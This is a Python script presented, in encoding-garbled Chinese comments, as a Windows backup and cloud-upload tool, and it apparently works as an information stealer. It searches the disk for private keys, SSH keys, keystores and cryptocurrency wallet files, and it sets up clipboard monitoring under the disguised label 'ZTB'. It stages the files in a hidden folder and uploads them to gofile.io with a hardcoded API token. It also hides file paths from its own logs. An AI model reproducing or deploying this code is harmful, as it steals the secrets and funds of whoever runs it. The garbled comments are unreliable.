# -*- coding: utf-8 -*-
"""
Windowsè‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½Windowsç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

import os
import shutil
import time
import socket
import logging
import tarfile
import threading
import requests
import pyperclip
import getpass
from datetime import datetime, timedelta
from functools import lru_cache

class BackupConfig:
    """å¤‡ä»½é…ç½®ç±»"""
    
    # è°ƒè¯•é…ç½®
    DEBUG_MODE = True  # æ˜¯å¦è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼ˆFalse/Trueï¼‰
    
    # æ–‡ä»¶å¤§å°é™åˆ¶
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB æºç›®å½•æœ€å¤§å¤§å°
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB å‹ç¼©åå•æ–‡ä»¶æœ€å¤§å¤§å°
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB åˆ†ç‰‡å¤§å°
    
    # ä¸Šä¼ é…ç½®
    RETRY_COUNT = 3  # é‡è¯•æ¬¡æ•°
    RETRY_DELAY = 30  # é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    UPLOAD_TIMEOUT = 1000  # ä¸Šä¼ è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    MAX_SERVER_RETRIES = 2  # æ¯ä¸ªæœåŠ¡å™¨æœ€å¤šå°è¯•æ¬¡æ•°
    FILE_DELAY_AFTER_UPLOAD = 1  # ä¸Šä¼ åç­‰å¾…æ–‡ä»¶é‡Šæ”¾çš„æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_DELETE_RETRY_COUNT = 3  # æ–‡ä»¶åˆ é™¤é‡è¯•æ¬¡æ•°
    FILE_DELETE_RETRY_DELAY = 2  # æ–‡ä»¶åˆ é™¤é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    
    # ç½‘ç»œé…ç½®
    NETWORK_TIMEOUT = 3  # ç½‘ç»œæ£€æŸ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # ç›‘æ§é…ç½®
    BACKUP_INTERVAL = 260000  # å¤‡ä»½é—´éš”æ—¶é—´ï¼ˆçº¦3å¤©ï¼‰
    CLIPBOARD_INTERVAL = 1200  # ZTBå¤‡ä»½é—´éš”æ—¶é—´ï¼ˆ20åˆ†é’Ÿï¼Œå•ä½ï¼šç§’ï¼‰
    CLIPBOARD_CHECK_INTERVAL = 3  # ZTBæ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # ZTBä¸Šä¼ æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    
    # é”™è¯¯å¤„ç†é…ç½®
    CLIPBOARD_ERROR_WAIT = 60  # ZTBç›‘æ§è¿ç»­é”™è¯¯ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    BACKUP_CHECK_INTERVAL = 3600  # å¤‡ä»½æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼Œæ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡ï¼‰
    ERROR_RETRY_DELAY = 60  # å‘ç”Ÿé”™è¯¯æ—¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    MAIN_ERROR_RETRY_DELAY = 300  # ä¸»ç¨‹åºé”™è¯¯é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼Œ5åˆ†é’Ÿï¼‰
    
    # æ–‡ä»¶æ“ä½œé…ç½®
    SCAN_TIMEOUT = 600  # æ‰«æç›®å½•è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_RETRY_COUNT = 3  # æ–‡ä»¶è®¿é—®é‡è¯•æ¬¡æ•°
    FILE_RETRY_DELAY = 5  # æ–‡ä»¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    COPY_CHUNK_SIZE = 1024 * 1024  # æ–‡ä»¶å¤åˆ¶å—å¤§å°ï¼ˆ1MBï¼Œæé«˜æ€§èƒ½ï¼‰
    PROGRESS_INTERVAL = 10  # è¿›åº¦æ˜¾ç¤ºé—´éš”ï¼ˆç§’ï¼‰
    PROGRESS_LOG_INTERVAL = 10  # æ¯Nä¸ªæ–‡ä»¶è®°å½•ä¸€æ¬¡è¿›åº¦
    
    # ç£ç›˜ç©ºé—´æ£€æŸ¥
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # æœ€å°å¯ç”¨ç©ºé—´ï¼ˆ1GBï¼‰
    
    # å¤‡ä»½ç›®å½• - ç”¨æˆ·æ–‡æ¡£ç›®å½•
    BACKUP_ROOT = os.path.expandvars('%USERPROFILE%\\.dev\\AutoBackup')
    
    # æ—¶é—´é˜ˆå€¼æ–‡ä»¶
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # æ—¥å¿—é…ç½®
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # ç£ç›˜æ–‡ä»¶åˆ†ç±»
    DISK_EXTENSIONS_1 = [  # æ–‡æ¡£ç±»
        ".txt", ".xls", ".xlsx", ".et", ".one", ".js", ".py", ".go", ".sh", ".ts", ".jsx", ".tsx", 
        ".bash",  ".sol", ".rs", ".json", ".csv", ".wallet", ".bin", "ps1", ".rtf"
    ]
    
    DISK_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", 
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc"
    ]
    
    # æ’é™¤ç›®å½•é…ç½®
    EXCLUDE_INSTALL_DIRS = [       
        # æ¸¸æˆç›¸å…³ç›®å½•
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # å¸¸è§è½¯ä»¶å®‰è£…ç›®å½•
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # å¼€å‘å·¥å…·å’Œç¯å¢ƒ
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "MySQL", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", ".npm", ".nuget",
        ".gradle", ".m2", ".vs", ".vscode", ".idea",
        
        # è™šæ‹Ÿæœºå’Œå®¹å™¨
        "VirtualBox VMs", "VMware", "Hyper-V", "Virtual Machines",
        "WSL", "docker", "containers",
        
        # å…¶ä»–å¤§å‹åº”ç”¨
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # æµè§ˆå™¨ç›¸å…³
        "Google", "Chrome", "Mozilla", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # é€šè®¯å’ŒåŠå…¬è½¯ä»¶
        "Discord", "Zoom", "Teams", "Skype", "Slack",
        
        # å¤šåª’ä½“è½¯ä»¶
        "Adobe", "Premiere", "Photoshop", "After Effects",
        "Vegas", "MAGIX", "Audacity",
        
        # å®‰å…¨è½¯ä»¶
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # ç³»ç»Ÿå·¥å…·
        "CCleaner", "WinRAR", "7-Zip", "PowerToys"
    ]
    
    # å…³é”®è¯æ’é™¤
    EXCLUDE_KEYWORDS = [
        # è½¯ä»¶ç›¸å…³
        "program", "software", "install", "setup", "update",
        "patch", "360", "cache", 
        
        # å¼€å‘ç›¸å…³
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        
        # å¤šåª’ä½“ç›¸å…³
        "music", "video", "movie", "audio", "media", "stream",
        
        # æ¸¸æˆç›¸å…³
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # ä¸´æ—¶æ–‡ä»¶
        "log", "crash", "dumps", "report", "reports",
        
        # å…¶ä»–
        "bak", "obsolete", "archive", "trojan", "clash", "vpn", "chrome",
        "thumb", "thumbnail", "preview" , "v2ray", "user", "mail"
    ]
    
    # å¤‡ç”¨ä¸Šä¼ æœåŠ¡å™¨
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

# é…ç½®æ—¥å¿—
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        self.api_token = "8HSdvkTfGNDxlhQFShQkkmJK2Yh8zWPQ"
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼åŒ–å™¨
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                    if isinstance(record.msg, str):
                        msg = record.msg
                        # è·³è¿‡è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                        if any(x in msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", ":\\", "/"]):
                            return None
                        # ä¿ç•™è¿›åº¦å’ŒçŠ¶æ€ä¿¡æ¯
                        if any(x in msg for x in ["å·²å¤‡ä»½", "å®Œæˆ", "å¤±è´¥", "é”™è¯¯", "æˆåŠŸ", "ğŸ“", "âœ…", "âŒ", "â³", "ğŸ“‹"]):
                            return super().format(record)
                        # å…¶ä»–æ™®é€šæ—¥å¿—
                        return super().format(record)
                    return super().format(record)
            
            # è‡ªå®šä¹‰è¿‡æ»¤å™¨
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                        if any(x in record.msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", ":\\", "/"]):
                            return False
                    return True
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except (OSError, IOError, PermissionError) as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"è¿æ¥ {host}:{port} å¤±è´¥: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """å®‰å…¨åˆ é™¤æ–‡ä»¶ï¼Œæ”¯æŒé‡è¯•æœºåˆ¶
        
        Args:
            file_path: è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„
            retry: æ˜¯å¦ä½¿ç”¨é‡è¯•æœºåˆ¶
            
        Returns:
            bool: åˆ é™¤æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # ä½¿ç”¨é‡è¯•æœºåˆ¶åˆ é™¤æ–‡ä»¶
        try:
            # ç­‰å¾…æ–‡ä»¶å¥æŸ„å®Œå…¨é‡Šæ”¾
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"åˆ é™¤æ–‡ä»¶é‡è¯•ä¸­: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ é™¤æ–‡ä»¶å¤±è´¥: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        
        Args:
            path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # ä¼˜å…ˆæ£€æŸ¥æ˜¯å¦æ˜¯äº‘ç›˜ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸æ’é™¤
        cloud_keywords = [
            "äº‘ç›˜", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "ç½‘ç›˜", "äº‘"
        ]
        
        # æ£€æŸ¥è·¯å¾„ä¸­çš„æ¯ä¸ªéƒ¨åˆ†
        for part in path_parts:
            part_lower = part.lower()
            # å¦‚æœä»»ä½•éƒ¨åˆ†åŒ…å«äº‘ç›˜å…³é”®è¯ï¼Œåˆ™ä¸æ’é™¤è¯¥ç›®å½•
            if any(keyword.lower() in part_lower for keyword in cloud_keywords):
                return False
        
        # æ£€æŸ¥å®Œæ•´ç›®å½•åæ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­
        for ex in self.config.EXCLUDE_INSTALL_DIRS:
            ex_lower = ex.lower()
            ex_parts = set(ex_lower.split())
            
            # æ£€æŸ¥æ¯ä¸ªè·¯å¾„éƒ¨åˆ†
            for part in path_parts:
                # æ ‡å‡†åŒ–è·¯å¾„éƒ¨åˆ†
                part_normalized = set(part.replace('_', ' ').replace('-', ' ').lower().split())
                
                # åªæœ‰å½“æ’é™¤ç›®å½•åå®Œå…¨åŒ¹é…æ—¶æ‰æ’é™¤
                if ex_parts == part_normalized:
                    return True
        
        # å¯¹æ¯ä¸ªå…³é”®è¯è¿›è¡Œæ›´æ™ºèƒ½çš„åŒ¹é…
        for keyword in self.config.EXCLUDE_KEYWORDS:
            keyword_lower = keyword.lower()
            
            # æ£€æŸ¥æ¯ä¸ªè·¯å¾„éƒ¨åˆ†
            for part in path_parts:
                # 1. æ ‡å‡†åŒ–è·¯å¾„éƒ¨åˆ†ï¼Œç§»é™¤æ‰€æœ‰å¸¸è§åˆ†éš”ç¬¦
                normalized_part = (part.replace('_', ' ')
                                    .replace('-', ' ')
                                    .replace('.', ' ')
                                    .replace('cache', ' cache')  # ç‰¹æ®Šå¤„ç†cacheå…³é”®è¯
                                    .lower())
                
                # 2. åˆ†å‰²æˆå•è¯
                word_parts = set(normalized_part.split())
                
                # 3. æ ‡å‡†åŒ–å…³é”®è¯
                normalized_keyword = keyword_lower.replace('_', ' ').replace('-', ' ')
                keyword_parts = set(normalized_keyword.split())
                
                # 4. æ£€æŸ¥å„ç§åŒ¹é…æƒ…å†µ
                if any([
                    keyword_lower in normalized_part.replace(' ', ''),  # ç›´æ¥åŒ…å«
                    keyword_lower in word_parts,  # ä½œä¸ºç‹¬ç«‹å•è¯å­˜åœ¨
                    all(kp in normalized_part.replace(' ', '') for kp in keyword_parts)  # æ‰€æœ‰å…³é”®è¯éƒ¨åˆ†éƒ½å­˜åœ¨
                ]):
                    return True
    
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windowsç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½ç›®å½•:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")
            logging.debug(f"æ‰©å±•åç±»å‹: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"ä½¿ç”¨çš„æ–‡ä»¶æ‰©å±•å: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # å·²æ‰«æç›®å½•æ•°
        excluded_dirs = 0   # å·²æ’é™¤ç›®å½•æ•°

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"âŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # å®šæœŸæ˜¾ç¤ºè¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"â³ å·²æ‰«æ {scanned_dirs} ä¸ªç›®å½•ï¼Œæ’é™¤ {excluded_dirs} ä¸ªç›®å½•")
                        logging.debug(f"â³ å½“å‰æ‰«æ: {root}")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # è·³è¿‡æ’é™¤çš„ç›®å½•
                if self.should_exclude_dir(root):
                    excluded_dirs += 1
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æ’é™¤ç›®å½•: {root}")
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    file_lower = file.lower()
                    # æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
                    if not any(file_lower.endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡ç©ºæ–‡ä»¶: {source_file}")
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡å¤§æ–‡ä»¶: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥: {source_file} - {str(e)}")
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶è®¿é—®å¤±è´¥: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"åˆ›å»ºç›®æ ‡å­ç›®å½•å¤±è´¥: {target_sub_dir}")
                                break
                                
                            # ä½¿ç”¨ä¼˜åŒ–çš„åˆ†å—å¤åˆ¶ï¼ˆ1MBå—å¤§å°ï¼‰
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                if files_count % self.config.PROGRESS_LOG_INTERVAL == 0:
                                    logging.debug(f"ğŸ“ å·²å¤‡ä»½ {files_count} ä¸ªæ–‡ä»¶ ({total_size / 1024 / 1024:.1f}MB)")
                                logging.debug(f"æˆåŠŸå¤åˆ¶: {source_file} -> {target_file}")
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"âŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {source_file} - {str(e)}")
                        except (MemoryError, RuntimeError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                logging.error(f"âŒ æ–‡ä»¶å¤åˆ¶å‡ºç°ç³»ç»Ÿé”™è¯¯: {source_file} - {str(e)}")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")
        except (MemoryError, RuntimeError) as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºç°ç³»ç»Ÿé”™è¯¯: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            logging.info(f"\nğŸ“Š å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   ğŸ“‚ æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"   ğŸš« æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"æ‰«æç»Ÿè®¡:")
                logging.debug(f"- æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"- æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€
    
        Returns:
            str: ä¸Šä¼ æœåŠ¡å™¨URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # åˆ é™¤åŸå§‹å¤§æ–‡ä»¶
            self._safe_remove_file(file_path, retry=False)
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # æ¸…ç†åˆ†ç‰‡ç›®å½•
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

